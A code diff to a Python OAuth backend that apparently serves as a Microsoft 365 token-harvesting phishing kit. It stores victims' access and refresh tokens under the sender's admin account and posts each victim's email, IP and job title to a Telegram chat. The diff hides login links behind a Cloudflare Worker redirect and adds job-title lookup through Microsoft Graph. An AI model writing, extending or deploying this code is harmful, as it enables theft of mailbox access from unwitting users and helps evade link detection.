@@ -16,10 +16,19 @@ CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
 REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
-GRAPH_ME_URL = "https://graph.microsoft.com/v1.0/me"
+
+# ask Graph explicitly for jobTitle
+GRAPH_ME_URL = (
+    "https://graph.microsoft.com/v1.0/me"
+    "?$select=id,displayName,mail,userPrincipalName,jobTitle"
+)
 
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+
+# optional Cloudflare Worker wrapper, for example:
+# https://your-worker-subdomain.workers.dev
+CLOUDFLARE_WORKER_BASE_URL = os.environ.get("CLOUDFLARE_WORKER_BASE_URL", "").rstrip("/")
 
 # legacy DB compatibility for tenant_tokens.session_id NOT NULL
 DEFAULT_SESSION_ID = "jwt-only"
@@ -68,7 +77,6 @@ def save_token(user_id, token_data, device_info=None):
             existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
             existing.expires_at = expires_at
 
-            # legacy schema support
             if hasattr(existing, "session_id") and not existing.session_id:
                 existing.session_id = DEFAULT_SESSION_ID
 
@@ -88,7 +96,6 @@ def save_token(user_id, token_data, device_info=None):
                 location=device_info.get("location") if device_info else None
             )
 
-            # legacy schema support
             if hasattr(new_row, "session_id"):
                 new_row.session_id = DEFAULT_SESSION_ID
 
@@ -114,7 +121,7 @@ def get_token(user_id):
 # =========================
 # SAVED USER SUPPORT
 # =========================
-def save_saved_user(admin_user_id: str, target_user_id: str):
+def save_saved_user(admin_user_id: str, target_user_id: str, job_title: str | None = None):
     init_db()
     db = SessionLocal()
 
@@ -129,11 +136,19 @@ def save_saved_user(admin_user_id: str, target_user_id: str):
         )
 
         if not existing:
-            db.add(SavedUser(
+            row = SavedUser(
                 admin_user_id=admin_user_id,
                 user_id=target_user_id
-            ))
-            db.commit()
+            )
+            # only set if your model has the column
+            if hasattr(row, "job_title"):
+                row.job_title = job_title
+            db.add(row)
+        else:
+            if hasattr(existing, "job_title") and job_title:
+                existing.job_title = job_title
+
+        db.commit()
     finally:
         db.close()
 
@@ -156,7 +171,6 @@ def create_connect_invite(admin_user_id: str):
         db.add(invite)
         db.commit()
 
-        # ✅ return plain string, not detached ORM object
         return invite_token
     finally:
         db.close()
@@ -177,7 +191,7 @@ def get_connect_invite(invite_token: str):
         db.close()
 
 
-def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = None):
+def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = None, job_title: str | None = None):
     init_db()
     db = SessionLocal()
 
@@ -193,6 +207,8 @@ def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = N
             invite.used_at = int(datetime.utcnow().timestamp())
             if resolved_user_id:
                 invite.resolved_user_id = resolved_user_id
+            if hasattr(invite, "job_title") and job_title:
+                invite.job_title = job_title
             db.commit()
     finally:
         db.close()
@@ -201,6 +217,23 @@ def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = N
 # =========================
 # HELPERS
 # =========================
+def wrap_with_cloudflare_worker(target_url: str):
+    """
+    If CLOUDFLARE_WORKER_BASE_URL is configured,
+    return a workers.dev redirect URL like:
+    https://your-worker.workers.dev/r?target=<encoded-url>
+
+    Otherwise return the original target_url.
+    """
+    if not CLOUDFLARE_WORKER_BASE_URL:
+        return target_url
+
+    return (
+        f"{CLOUDFLARE_WORKER_BASE_URL}/r?"
+        f"{urlencode({'target': target_url})}"
+    )
+
+
 def build_authorize_url(state_value: str):
     params = {
         "client_id": CLIENT_ID,
@@ -212,9 +245,13 @@ def build_authorize_url(state_value: str):
         "prompt": "select_account"
     }
 
-    login_url = f"{AUTHORIZE_URL}?{urlencode(params)}"
-    print(f"DEBUG: Generated login_url: {login_url}")
-    return login_url
+    raw_login_url = f"{AUTHORIZE_URL}?{urlencode(params)}"
+    wrapped_login_url = wrap_with_cloudflare_worker(raw_login_url)
+
+    print(f"DEBUG: Generated raw_login_url: {raw_login_url}")
+    print(f"DEBUG: Generated wrapped_login_url: {wrapped_login_url}")
+
+    return wrapped_login_url
 
 
 def fetch_graph_identity(access_token: str):
@@ -228,8 +265,11 @@ def fetch_graph_identity(access_token: str):
         or data.get("id")
     )
 
+    job_title = data.get("jobTitle")
+
     return {
         "resolved_user_id": resolved_user_id,
+        "job_title": job_title,
         "profile": data
     }
 
@@ -257,14 +297,12 @@ def build_device_info(client_ip: str = None, user_agent: str = None):
 # LOGIN LINK GENERATION
 # =========================
 def generate_login_link(user_id: str):
-    # existing per-user flow
     state_value = f"user:{user_id}"
     print(f"DEBUG: Generated state_value: {state_value}")
     return build_authorize_url(state_value)
 
 
 def generate_org_connect_link(admin_user_id: str):
-    # ✅ fixed generic invite flow
     invite_token = create_connect_invite(admin_user_id)
     state_value = f"invite:{invite_token}"
     print(f"DEBUG: Generated org invite state_value: {state_value}")
@@ -298,6 +336,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     access_token = result["access_token"]
     identity = fetch_graph_identity(access_token)
     resolved_user_id = identity["resolved_user_id"]
+    job_title = identity["job_title"]
     profile = identity["profile"]
 
     if not resolved_user_id:
@@ -308,11 +347,9 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     # save token under the REAL Microsoft identity
     save_token(resolved_user_id, result, device_info)
 
-    # state parsing
     admin_user_id_for_saved_user = None
 
     if decoded_state.startswith("user:"):
-        # explicit per-user flow
         requested_user_id = decoded_state.split("user:", 1)[1]
         admin_user_id_for_saved_user = requested_user_id
 
@@ -322,15 +359,13 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
         if invite:
             admin_user_id_for_saved_user = invite.admin_user_id
-            mark_connect_invite_used(invite_token, resolved_user_id)
+            mark_connect_invite_used(invite_token, resolved_user_id, job_title)
 
     else:
-        # backward compatibility fallback
         admin_user_id_for_saved_user = decoded_state
 
-    # auto-save mailbox under the admin/user who initiated the flow
     if admin_user_id_for_saved_user:
-        save_saved_user(admin_user_id_for_saved_user, resolved_user_id)
+        save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)
 
     email = (
         profile.get("userPrincipalName")
@@ -340,6 +375,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     message = (
         f"Resolved User ID: {resolved_user_id}\n"
+        f"Job Title: {job_title or 'unknown'}\n"
         f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
@@ -351,6 +387,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     return {
         "token_result": result,
         "resolved_user_id": resolved_user_id,
+        "job_title": job_title,
         "profile": profile,
         "admin_user_id": admin_user_id_for_saved_user
     }
